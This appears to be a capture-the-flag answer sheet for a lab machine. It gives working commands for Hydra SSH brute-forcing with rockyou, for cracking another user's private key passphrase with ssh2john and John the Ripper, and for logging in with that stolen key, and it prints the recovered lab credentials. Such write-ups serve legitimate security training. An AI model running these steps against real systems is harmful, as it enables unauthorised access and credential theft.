## Questions

4. User brute-forcing to find the username & password

```
username: connect to smb://$IP and look into staff.txt
password: hydra for ssh with username
```

5. What is the username?

```
jan
```

6. What is the password?

```
hydra -l jan -P /media/nikesh/HDD/Security/wordlist/rockyou.txt 10.10.255.203 -f ssh

armando
```

7. What service do you use to access the server(answer in abbreviation in all caps)?

```
SSH
```

8. Enumerate the machine to find any vectors for privilege escalation

```
use a privilege escalation checklist or tool like LinEnum

```

9. What is the name of the other user you found(all lower case)?

```
staff.txt

kay
```

10. If you have found another user, what can you do with this information?

```
apart from a password, how else can a user access a machine?
ssh key may be
```

11. What is the final password you obtain?

```
use john the ripper to bruteforce the passphrase
/home/kay/.ssh has private ssh keys

copy id_rsa to a file
ssh2john id_rsa > to_crack.txt
john --wordlist=/path/to/wordlist.txt to_crack.txt

kay:beeswax

ssh using jan
and then ssh using -i ~/.ssh/id_rsa kay
cat pass.bak
